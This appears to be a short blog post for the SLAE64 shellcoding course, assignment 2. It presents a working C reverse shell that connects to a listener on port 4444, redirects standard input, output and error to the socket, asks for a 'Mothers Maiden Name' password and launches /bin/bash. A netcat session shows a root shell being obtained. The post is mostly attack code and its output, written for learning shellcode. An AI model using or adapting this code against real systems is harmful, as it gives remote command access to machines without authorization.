---
title: SLAE64 Assignment 2 - Password Protected Reverse Shell
date: 2020-4-06
layout: single
classes: wide
header:
  teaser: /assets/images/SLAE64.png
tags:
  - Reverse
  - Shell
  - Assembly
  - Code
  - SLAE
  - Linux
  - x64
  - Shellcode
--- 
![](/assets/images/SLAE64.png)


# C Reverse Shell 
I first created a skelton reverse shell using the C language to reverse engineer the work needed to be done for the assembly shellcode version.

## revshell.c
```c
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h> /* superset of previous */
#include <stdlib.h>
int main(void)
{
	int ipv4Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	struct sockaddr_in ipSocketAddr = { 
        .sin_family = AF_INET, 
        .sin_port = htons(4444), 
        .sin_addr.s_addr = inet_addr("127.1.1.1") 
    };
	connect(ipv4Socket, (struct sockaddr*)&ipSocketAddr, sizeof(ipSocketAddr)); 
	dup2(ipv4Socket, 0); // Standard Input
	dup2(ipv4Socket, 1); // Standard Output
	dup2(ipv4Socket, 2); // Standard Error
    write(ipv4Socket, "Mothers Maiden Name?", 20); 
    char buff[4];
    read(ipv4Socket, buff, 4);
	execve("/bin/bash", NULL, NULL);
}	
```
+ Password checking will be done in assembly and is not included in the C skeleton program.

## Compiling & Testing
```bash
root# gcc revshell.c -o revshell
root# ./revshell 
────────────────────────────────────────────────────────────
root# nc -nlvp 4444
listening on [any] 4444 ...
connect to [127.1.1.1] from (UNKNOWN) [127.0.0.1] 44006
Mothers Maiden Name?1337
id
uid=0(root) gid=0(root) groups=0(root),46(plugdev)
```
